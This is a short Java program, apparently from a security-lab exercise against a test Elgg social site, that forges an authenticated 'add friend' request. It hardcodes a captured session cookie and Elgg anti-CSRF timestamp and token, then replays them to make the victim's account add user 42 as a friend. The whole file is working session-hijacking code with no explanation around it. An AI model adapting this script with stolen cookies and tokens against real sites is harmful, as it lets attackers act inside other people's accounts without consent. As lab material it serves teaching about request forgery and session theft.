import java.io.*;
import java.net.*;
public class HTTPSimpleForge {
public static void main(String[] args) throws IOException {
try {
int responseCode;
InputStream responseIn=null;
String requestDetails = "&__elgg_ts=1459184328&__elgg_token=f7dee30794c4d1f10c9d5ce0322ea48a";
URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=42"+requestDetails);
HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
if (urlConn instanceof HttpURLConnection) {
urlConn.setConnectTimeout(60000);
urlConn.setReadTimeout(90000);
}
urlConn.setRequestMethod("GET");
urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
String Cookie = "Elgg=ijr44mgs952061spv802v8aul7";
urlConn.setRequestProperty("Cookie","Elgg=ijr44mgs952061spv802v8aul7");
String data = "name=...&guid=..";
urlConn.setDoOutput(true);
OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
wr.write(data);
wr.flush();
if (urlConn instanceof HttpURLConnection) {
HttpURLConnection httpConn = (HttpURLConnection) urlConn;
responseCode = httpConn.getResponseCode();
System.out.println("Response Code = " + responseCode);
if (responseCode == HttpURLConnection.HTTP_OK)
responseIn = urlConn.getInputStream();
}
} catch (MalformedURLException e) {
e.printStackTrace();
}
}
}

